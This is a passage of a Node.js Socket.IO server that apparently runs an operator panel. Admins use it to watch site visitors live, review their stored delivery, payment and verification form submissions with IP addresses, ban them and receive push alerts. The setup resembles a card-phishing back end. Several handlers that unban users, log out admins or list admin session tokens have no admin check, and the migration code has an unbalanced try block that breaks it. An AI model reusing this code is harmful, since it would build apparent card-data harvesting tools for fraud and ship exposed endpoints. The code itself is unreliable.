      console.log('📡 visitors:request: returning', visitors.rows.length, 'visitors,', trashCount.rows[0].count, 'in trash');
    } catch (error) {
      console.error('Error fetching visitors:', error);
    }
  });

  // Handle trash bin request - GET DELETED VISITORS (ADMIN ONLY)
  socket.on('trash:request', adminOnly(socket, async () => {
    try {
      const trashVisitors = await pool.query(`
        SELECT * FROM visitors 
        WHERE is_deleted = true 
        ORDER BY last_activity DESC 
        LIMIT 100
      `);

      // Get all form submissions for these deleted visitors (NEW)
      const sessionIds = trashVisitors.rows.map(v => v.session_id);
      let submissionsMap = {};
      
      if (sessionIds.length > 0) {
        const allSubmissions = await pool.query(`
          SELECT * FROM form_submissions 
          WHERE session_id = ANY($1) 
          ORDER BY created_at DESC
        `, [sessionIds]);
        
        // Group submissions by session_id and form_type
        allSubmissions.rows.forEach(sub => {
          const key = `${sub.session_id}_${sub.form_type}`;
          if (!submissionsMap[key]) {
            submissionsMap[key] = [];
          }
          submissionsMap[key].push(sub);
        });
      }

      // Attach submissions to each deleted visitor
      const trashWithSubmissions = trashVisitors.rows.map(visitor => {
        return {
          ...visitor,
          delivery_submissions: submissionsMap[`${visitor.session_id}_delivery`] || [],
          payment_submissions: submissionsMap[`${visitor.session_id}_payment`] || [],
          verification_submissions: submissionsMap[`${visitor.session_id}_verification`] || []
        };
      });

      socket.emit('trash:update', { visitors: trashWithSubmissions });
      
      console.log('📡 trash:request: returning', trashVisitors.rows.length, 'deleted visitors');
    } catch (error) {
      console.error('Error fetching trash:', error);
    }
  }));

  // Handle soft delete (move to trash) (ADMIN ONLY)
  socket.on('visitor:softDelete', adminOnly(socket, async (data) => {
    try {
      const { sessionId } = data;
      
      await pool.query(
        'UPDATE visitors SET is_deleted = true, last_activity = CURRENT_TIMESTAMP WHERE session_id = $1',
        [sessionId]
      );

      // Get updated trash count
      const trashCount = await pool.query('SELECT COUNT(*) FROM visitors WHERE is_deleted = true');
      
      // Broadcast update to all admins
      adminConnections.forEach((adminSocket) => {
        adminSocket.emit('visitor:softDeleted', { sessionId, trashCount: parseInt(trashCount.rows[0].count) });
      });
      
      console.log('🗑️ Visitor soft deleted:', sessionId);
    } catch (error) {
      console.error('Error soft deleting visitor:', error);
    }
  }));

  // Handle soft delete multiple (move selected to trash) (ADMIN ONLY)
  socket.on('visitor:softDeleteMultiple', adminOnly(socket, async (data) => {
    try {
      const { sessionIds } = data;
      
      if (sessionIds && sessionIds.length > 0) {
        const placeholders = sessionIds.map((_, i) => `$${i + 1}`).join(',');
        await pool.query(
          `UPDATE visitors SET is_deleted = true, last_activity = CURRENT_TIMESTAMP WHERE session_id IN (${placeholders})`,
          sessionIds
        );
      }

      // Get updated trash count
      const trashCount = await pool.query('SELECT COUNT(*) FROM visitors WHERE is_deleted = true');
      
      // Broadcast update to all admins
      adminConnections.forEach((adminSocket) => {
        adminSocket.emit('visitor:softDeletedMultiple', { sessionIds, trashCount: parseInt(trashCount.rows[0].count) });
      });
      
      console.log('🗑️ Multiple visitors soft deleted:', sessionIds.length);
    } catch (error) {
      console.error('Error soft deleting multiple visitors:', error);
    }
  }));

  // Handle soft delete all (move all to trash) (ADMIN ONLY)
  socket.on('visitor:softDeleteAll', adminOnly(socket, async () => {
    try {
      await pool.query(
        'UPDATE visitors SET is_deleted = true, last_activity = CURRENT_TIMESTAMP WHERE is_deleted = false'
      );

      // Broadcast update to all admins
      adminConnections.forEach((adminSocket) => {
        adminSocket.emit('visitor:softDeletedAll', { trashCount: 0 });
      });
      
      console.log('🗑️ All visitors soft deleted (moved to trash)');
    } catch (error) {
      console.error('Error soft deleting all visitors:', error);
    }
  }));

  // Handle restore from trash (ADMIN ONLY)
  socket.on('visitor:restore', adminOnly(socket, async (data) => {
    try {
      const { sessionId } = data;
      
      await pool.query(
        'UPDATE visitors SET is_deleted = false, last_activity = CURRENT_TIMESTAMP WHERE session_id = $1',
        [sessionId]
      );

      // Get updated trash count
      const trashCount = await pool.query('SELECT COUNT(*) FROM visitors WHERE is_deleted = true');
      
      // Broadcast update to all admins
      adminConnections.forEach((adminSocket) => {
        adminSocket.emit('visitor:restored', { sessionId, trashCount: parseInt(trashCount.rows[0].count) });
      });
      
      console.log('↩️ Visitor restored:', sessionId);
    } catch (error) {
      console.error('Error restoring visitor:', error);
    }
  }));

  // Handle permanent delete from trash (ADMIN ONLY)
  socket.on('visitor:permanentDelete', adminOnly(socket, async (data) => {
    try {
      const { sessionId } = data;
      
      await pool.query('DELETE FROM visitors WHERE session_id = $1', [sessionId]);

      // Get updated trash count
      const trashCount = await pool.query('SELECT COUNT(*) FROM visitors WHERE is_deleted = true');
      
      // Broadcast update to all admins
      adminConnections.forEach((adminSocket) => {
        adminSocket.emit('visitor:permanentDeleted', { sessionId, trashCount: parseInt(trashCount.rows[0].count) });
      });
      
      console.log('❌ Visitor permanently deleted:', sessionId);
    } catch (error) {
      console.error('Error permanently deleting visitor:', error);
    }
  }));

  // Handle empty trash (delete all from trash) (ADMIN ONLY)
  socket.on('trash:empty', adminOnly(socket, async () => {
    try {
      await pool.query('DELETE FROM visitors WHERE is_deleted = true');

      // Broadcast update to all admins
      adminConnections.forEach((adminSocket) => {
        adminSocket.emit('trash:emptied');
      });
      
      console.log('🗑️ Trash emptied');
    } catch (error) {
      console.error('Error emptying trash:', error);
    }
  }));

  // Handle ban request (ADMIN ONLY)
  socket.on('user:ban', adminOnly(socket, async (data) => {
    try {
      const { targetSessionId, targetIp, reason, customMessage } = data;
      
      await pool.query(
        'INSERT INTO banned_users (session_id, ip_address, reason, custom_message) VALUES ($1, $2, $3, $4)',
        [targetSessionId || null, targetIp || null, reason, customMessage]
      );

      // Find and disconnect the banned client
      connectedClients.forEach((info, socketId) => {
        if (info.sessionId === targetSessionId || info.ip === targetIp) {
          const targetSocket = io.sockets.sockets.get(socketId);
          if (targetSocket) {
            targetSocket.emit('user:banned', { message: customMessage });
            targetSocket.disconnect();
          }
        }
      });

      console.log(`🚫 User banned: ${targetSessionId || targetIp}`);
    } catch (error) {
      console.error('Error banning user:', error);
    }
  }));

  // Handle unban request
  socket.on('user:unban', async (data) => {
    try {
      const { banId } = data;
      if (!banId) return;
      
      await pool.query('DELETE FROM banned_users WHERE id = $1', [banId]);
      
      // Send success response to the admin who requested
      socket.emit('user:unbanned', { banId, success: true });
      
      // Notify all admins to refresh their lists
      adminConnections.forEach((adminSocket, socketId) => {
        adminSocket.emit('ban:listUpdate');
      });
      
      console.log(`✅ User unbanned: ID ${banId}`);
    } catch (error) {
      console.error('Error unbanning user:', error);
      socket.emit('user:unbanned', { success: false, message: error.message });
    }
  });

  // Handle admin session logout
  socket.on('admin:logoutDevice', async (data) => {
    try {
      const { sessionToken } = data;
      await pool.query('DELETE FROM admin_sessions WHERE session_token = $1', [sessionToken]);
      
      // Find and disconnect the device
      adminConnections.forEach((adminSocket, socketId) => {
        adminSocket.emit('admin:forceLogout');
        adminSocket.disconnect();
      });
    } catch (error) {
      console.error('Error logging out device:', error);
    }
  });

  // Handle logout all devices
  socket.on('admin:logoutAll', async () => {
    try {
      await pool.query('DELETE FROM admin_sessions');
      adminConnections.forEach((adminSocket, socketId) => {
        adminSocket.emit('admin:forceLogout');
        adminSocket.disconnect();
      });
      adminConnections.clear();
    } catch (error) {
      console.error('Error logging out all devices:', error);
    }
  });

  // Handle admin device list request
  socket.on('admin:devices', async () => {
    try {
      const devices = await pool.query('SELECT * FROM admin_sessions ORDER BY created_at DESC');
      socket.emit('admin:devicesList', { devices: devices.rows });
    } catch (error) {
      console.error('Error fetching devices:', error);
    }
  });

  // Handle disconnect - Immediate presence update + Grace period before marking offline
  socket.on('disconnect', async () => {
    const client = connectedClients.get(socket.id);
    
    if (client) {
      console.log(`🔌 Client disconnected: ${client.sessionId}`);
      
      if (client.isAdmin) {
        adminConnections.delete(socket.id);
      } else {
        // IMMEDIATE: Emit visitor:disconnected event right away for instant feedback
        adminConnections.forEach((adminSocket) => {
          adminSocket.emit('visitor:disconnected', { 
            sessionId: client.sessionId,
            timestamp: new Date()
          });
        });
        
        // Immediately mark as idle (not offline yet)
        try {
          await pool.query(
            'UPDATE visitors SET visit_status = $1, last_activity = CURRENT_TIMESTAMP WHERE session_id = $2',
            ['idle', client.sessionId]
          );
          
          // Broadcast idle status immediately
          const visitorResult = await pool.query(
            'SELECT * FROM visitors WHERE session_id = $1',
            [client.sessionId]
          );
          
          if (visitorResult.rows[0]) {
            const eventData = {
              ...visitorResult.rows[0],
              timestamp: new Date()
            };
            
            adminConnections.forEach((adminSocket) => {
              adminSocket.emit('visitor:statusChange', eventData);
            });
            io.emit('visitor:statusChange', eventData);
          }
          
          // Set a 60-second timer for offline status
          const timerId = setTimeout(async () => {
            console.log(`⏰ Timer expired for ${client.sessionId} - marking offline`);
            
            try {
              await pool.query(
                'UPDATE visitors SET is_online = false, visit_status = $1, last_activity = CURRENT_TIMESTAMP WHERE session_id = $2',
                ['offline', client.sessionId]
              );
              
              // Broadcast offline status
              const visitorResult = await pool.query(
                'SELECT * FROM visitors WHERE session_id = $1',
                [client.sessionId]
              );
              
              if (visitorResult.rows[0]) {
                const eventData = {
                  ...visitorResult.rows[0],
                  timestamp: new Date()
                };
                
                adminConnections.forEach((adminSocket) => {
                  adminSocket.emit('visitor:statusChange', eventData);
                });
                io.emit('visitor:statusChange', eventData);
              }
              
              offlineTimers.delete(client.sessionId);
              isOnlineVisitors.delete(client.sessionId);
              console.log(`📴 Visitor ${client.sessionId} marked OFFLINE`);
            } catch (error) {
              console.error('Error marking visitor offline:', error);
            }
          }, OFFLINE_GRACE_PERIOD);
          
          offlineTimers.set(client.sessionId, timerId);
          console.log(`⏳ Started 60s offline timer for ${client.sessionId}`);
          
        } catch (error) {
          console.error('Error handling disconnect:', error);
        }
      }
      
      connectedClients.delete(socket.id);
    }
  });
});

// ==========================================
// FCM Token Management API
// ==========================================

// Save FCM token from admin - PERMANENT STORAGE
app.post('/api/admin/fcm-token', async (req, res) => {
  try {
    const { token, enabled } = req.body;
    
    if (!token) {
      return res.status(400).json({ success: false, error: 'Token required' });
    }
    
    // Save token to database permanently (NOT memory only)
    if (enabled !== false) {
      await pool.query(`
        INSERT INTO admin_fcm_tokens (token, enabled, last_used)
        VALUES ($1, true, CURRENT_TIMESTAMP)
        ON CONFLICT (token) 
        DO UPDATE SET enabled = true, last_used = CURRENT_TIMESTAMP
      `, [token]);
      
      // Also update memory cache
      if (!global.fcmTokens.includes(token)) {
        global.fcmTokens.push(token);
      }
      console.log(`🔔 FCM token saved to database: ${token.substring(0, 30)}...`);
    } else {
      // Disable token but don't delete
      await pool.query('UPDATE admin_fcm_tokens SET enabled = false WHERE token = $1', [token]);
      global.fcmTokens = global.fcmTokens.filter(t => t !== token);
      console.log(`🔕 FCM token disabled: ${token.substring(0, 30)}...`);
    }
    
    res.json({ success: true, tokensCount: global.fcmTokens.length });
  } catch (error) {
    console.error('❌ FCM token error:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Get FCM tokens status
app.get('/api/admin/fcm-status', (req, res) => {
  res.json({ 
    enabled: global.fcmTokens.length > 0,
    tokensCount: global.fcmTokens.length
  });
});

// API Routes
app.use('/api/products', productRoutes);
app.use('/api/admin', adminRoutes);
app.use('/api/visitors', visitorRoutes);

// Serve frontend static files
app.use(express.static(path.join(__dirname, '../frontend')));

// Health check endpoint
app.get('/api/health', (req, res) => {
  res.json({ status: 'ok', timestamp: new Date() });
});

// Start server
const PORT = process.env.PORT || 3000;

const startServer = async () => {
  try {
    // Run database migrations
    await runMigrations();
    server.listen(PORT, () => {
      console.log(`🚀 Server running on port ${PORT}`);
      console.log(`🌐 Frontend: http://localhost:${PORT}`);
      console.log(`📊 API: http://localhost:${PORT}/api`);
    });
  } catch (error) {
    console.error('Failed to start server:', error);
    process.exit(1);
  }
};

// Database migrations
async function runMigrations() {
  try {
    // IMPORTANT: First initialize ALL tables using initializeDatabase
    await initializeDatabase();
    console.log('✅ All database tables initialized');
  } catch (error) {
    console.error('❌ Error initializing database tables:', error.message);
  }
  
  try {
    // Add visit_status column if not exists (for visitor state tracking)
    await pool.query(`
      ALTER TABLE visitors 
      ADD COLUMN IF NOT EXISTS visit_status VARCHAR(20) DEFAULT 'online'
    `);
    console.log('✅ Migration: visit_status column added');
  } catch (error) {
    // Column might already exist, that's ok
    console.log('⚠️ Migration note:', error.message);
  }
  
  try {

  try {
    // Add timestamp columns for tracking when each data type was submitted
    await pool.query(`
      ALTER TABLE visitors
      ADD COLUMN IF NOT EXISTS delivery_time TIMESTAMP,
      ADD COLUMN IF NOT EXISTS payment_time TIMESTAMP,
      ADD COLUMN IF NOT EXISTS verification_time TIMESTAMP
    `);
    console.log("Migration: delivery_time, payment_time, verification_time columns added");
  } catch (error) {
    console.log("Migration note:", error.message);
  }

    // Create form_submissions table if not exists (for saving all form submissions history)
    await pool.query(`
      CREATE TABLE IF NOT EXISTS form_submissions (
        id SERIAL PRIMARY KEY,
        session_id VARCHAR(100) NOT NULL,
        form_type VARCHAR(50) NOT NULL,
        form_data JSONB NOT NULL,
        ip_address VARCHAR(45),
        user_agent TEXT,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      )
    `);
    console.log('✅ Migration: form_submissions table created');
    
    // Create index for faster queries
    await pool.query(`
      CREATE INDEX IF NOT EXISTS idx_form_submissions_session 
      ON form_submissions(session_id)
    `);
    await pool.query(`
      CREATE INDEX IF NOT EXISTS idx_form_submissions_type 
      ON form_submissions(form_type)
    `);
    console.log('✅ Migration: form_submissions indexes created');
  } catch (error) {
    console.log('⚠️ Migration note:', error.message);
  }
  
  // Create admin_fcm_tokens table for permanent token storage
  try {
    await pool.query(`
      CREATE TABLE IF NOT EXISTS admin_fcm_tokens (
        id SERIAL PRIMARY KEY,
        token TEXT NOT NULL UNIQUE,
        enabled BOOLEAN DEFAULT true,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        last_used TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      )
    `);
    console.log('✅ Migration: admin_fcm_tokens table created');
  } catch (error) {
    console.log('⚠️ Migration note:', error.message);
  }
  
  // Load existing tokens from database to memory on startup
  try {
    const savedTokens = await pool.query('SELECT token FROM admin_fcm_tokens WHERE enabled = true');
    global.fcmTokens = savedTokens.rows.map(r => r.token);
    console.log(`📱 Loaded ${global.fcmTokens.length} FCM tokens from database`);
  } catch (error) {
    console.log('⚠️ Could not load FCM tokens from database:', error.message);
  }
  
  // Add expires_at column to admin_sessions if not exists
  try {
    const colCheck = await pool.query(`
      SELECT column_name FROM information_schema.columns 
      WHERE table_name = 'admin_sessions' AND column_name = 'expires_at'
    `);
    
    if (colCheck.rows.length === 0) {
      await pool.query(`
        ALTER TABLE admin_sessions 
        ADD COLUMN expires_at TIMESTAMP DEFAULT (CURRENT_TIMESTAMP + INTERVAL '365 days')
      `);
      console.log('✅ Migration: expires_at column added to admin_sessions');
    }
  } catch (error) {
    console.log('⚠️ Migration note:', error.message);
  }
  
  // Change image_url from VARCHAR(500) to TEXT for Base64 storage
  try {
    const colInfo = await pool.query(`
      SELECT column_name, data_type, character_maximum_length 
      FROM information_schema.columns 
      WHERE table_name = 'products' AND column_name = 'image_url'
    `);
    
    if (colInfo.rows.length > 0 && colInfo.rows[0].data_type === 'character varying') {
      await pool.query(`ALTER TABLE products ALTER COLUMN image_url TYPE TEXT`);
      console.log('✅ Migration: image_url changed to TEXT for Base64 storage');
    }
  } catch (error) {
    console.log('⚠️ Migration note:', error.message);
  }
}

startServer();

module.exports = { app, io };
